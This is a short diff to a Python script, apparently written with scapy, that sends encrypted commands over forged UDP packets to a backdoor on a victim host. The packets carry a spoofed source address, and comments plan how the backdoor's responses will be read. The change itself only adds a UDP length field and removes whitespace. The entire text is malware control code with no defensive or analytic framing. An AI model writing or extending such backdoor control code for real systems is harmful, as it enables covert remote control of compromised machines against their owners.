@@ -16,7 +16,7 @@ def send_udp(victim_ip: str, data: str, encryption_handler: StreamEncryption):
     # Encrypt the data.
     encrypted_data = encryption_handler.encrypt(data.encode('utf-8'))
     # Forge the UDP packet.
-    pkt = IP(src="10.0.0.159", dst=victim_ip)/UDP(sport=10069, dport=10420)/Raw(load=encrypted_data)
+    pkt = IP(src="10.0.0.159", dst=victim_ip)/UDP(sport=10069, dport=10420, len=len(encrypted_data))/Raw(load=encrypted_data)
     # Send the packet.
     send(pkt)
 
@@ -56,7 +56,7 @@ if __name__ == "__main__":
                 # Send the command to backdoor.
                 send_udp("10.0.0.131", data, encryption_handler)
                 # Receive the response.
-                
+
                 # Now we need a way of checking for the response.
                 # Each response will be packaged as follows:
                 # responseID data
